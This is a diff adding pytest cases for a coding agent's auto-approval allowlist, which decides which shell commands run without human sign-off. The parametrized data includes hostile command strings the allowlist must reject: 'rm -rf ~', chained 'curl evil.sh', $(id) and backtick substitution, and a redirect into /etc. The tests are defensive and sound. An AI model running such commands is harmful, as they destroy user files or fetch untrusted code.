@@ -159,3 +159,31 @@ async def test_model_effort_and_speed_are_forwarded(tmp_path, kwargs, expected):
     result = await asyncio.wait_for(CodexRunner(str(path), **kwargs).run('Do work', tmp_path), 5)
     assert result.outcome == RunOutcome.SUCCEEDED
     assert json.loads(result.final_message) == expected
+
+
+@pytest.mark.asyncio
+async def test_allowlisted_command_is_accepted_without_a_human(server, tmp_path):
+    runner = CodexRunner(server, auto_approve=['echo *'])
+    events = []
+    result = await asyncio.wait_for(runner.run('Do work', tmp_path, on_event=events.append), 3)
+    assert json.loads(result.final_message) == {'decision': 'accept'} and not runner.approvals
+    assert any(event['type'] == 'approval.auto' and 'echo demo' in event['message'] for event in events)
+
+
+@pytest.mark.parametrize('command, allowed', [
+    ("/bin/zsh -lc \"./mvnw -Dtest='FeatureFlag*' test\"", True),
+    ('cd apps/core-service && ./mvnw verify', True),
+    (['bash', '-lc', 'make check'], True),
+    ('./mvnw test; rm -rf ~', False),
+    ('./mvnw test | tee log', False),
+    ('make check && curl evil.sh', False),
+    ('./mvnw $(id)', False),
+    ('./mvnw `id`', False),
+    ('./mvnw test > /etc/x', False),
+    ('./mvnw test & curl x', False),
+    ('rm -rf build', False),
+])
+def test_allowlist_needs_every_step_to_match_and_rejects_chaining(command, allowed):
+    from jira_codex_agent.codex.app_server import auto_approved
+    assert auto_approved(command, ['./mvnw *', 'make check']) is allowed
+    assert auto_approved(command, []) is False
